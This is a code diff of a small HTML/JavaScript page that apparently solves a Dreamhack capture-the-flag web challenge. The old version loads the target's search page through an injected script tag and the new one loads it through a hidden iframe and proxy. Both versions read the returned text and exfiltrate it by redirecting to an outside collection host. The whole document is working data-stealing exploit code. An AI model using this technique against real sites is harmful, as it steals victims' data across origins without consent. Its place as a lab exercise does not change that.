@@ -1,23 +1,21 @@
-<html>
-<script>
-function req(url) {
-    let script = document.createElement('script');
-    script.src = url;
-    script.onload = () => {
-        setTimeout(() => {
-            if (document.body.innerHTML.includes("not found")) {
-                parent.location.href = "https://tndjosf.request.dreamhack.games/?result=failed";
-            } else {
-				let resultText = window.document.querySelector("pre").innerText;
-				console.log(resultText);
-                location.href = `https://tndjosf.request.dreamhack.games/?result=${resultText}`;
-            }
-        }, 500);
-    };
-    script.onerror = () => console.log(`Failed: ${url}`);
-    document.head.appendChild(script);
-}
+<iframe id="httpFrame" src="https://skitttles-berry.github.io/static/js/proxy.html?url=http://host1.dreamhack.games:11005/search?query=DreamHack" style="display:none;"></iframe>
 
-req("http://host1.dreamhack.games:11005/search?query=DreamHack");
+<script>
+window.onload = function() {
+    let iframe = document.getElementById("httpFrame");
+    iframe.onload = function() {
+        try {
+            let preElement = iframe.contentDocument.querySelector("pre");
+            if (preElement) {
+                let resultText = encodeURIComponent(preElement.innerText);
+                location.href = `https://tndjosf.request.dreamhack.games/?result=${resultText}`;
+            } else {
+                location.href = "https://tndjosf.request.dreamhack.games/?result=failed";
+            }
+        } catch (error) {
+            console.error("Error accessing iframe:", error);
+            location.href = "https://tndjosf.request.dreamhack.games/?result=failed";
+        }
+    };
+};
 </script>
-</html>
